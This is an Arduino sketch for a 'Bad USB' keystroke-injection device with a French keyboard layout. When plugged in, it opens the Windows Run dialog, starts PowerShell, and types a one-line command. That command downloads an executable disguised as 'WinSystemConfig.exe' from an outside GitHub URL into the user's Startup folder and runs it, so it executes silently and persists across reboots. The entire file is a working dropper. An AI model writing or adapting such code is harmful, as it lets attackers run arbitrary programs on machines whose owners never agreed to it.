
#include <Keyboard.h>
#include <KeyboardLayout.h>
#include <Keyboard_fr_FR.h>

void setup() {
  Keyboard.begin(KeyboardLayout_fr_FR);
  delay(3000);


  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(50);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("powershell");
  Keyboard.write(KEY_RETURN);
  delay(1500);

  String cmd = "https://raw.githubusercontent.com/Tristan654/Projet_Bad_USB/main/Executable/Executable_Windows/dist/WinSystemConfig.exe";
  Keyboard.print("$p=$env:APPDATA+'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinSystemConfig.exe'; iwr " + cmd + " -o $p; Start-Process $p");  
  Keyboard.write(KEY_RETURN);
  Keyboard.releaseAll();
}

void loop() {
  // put your main code here, to run repeatedly:

}
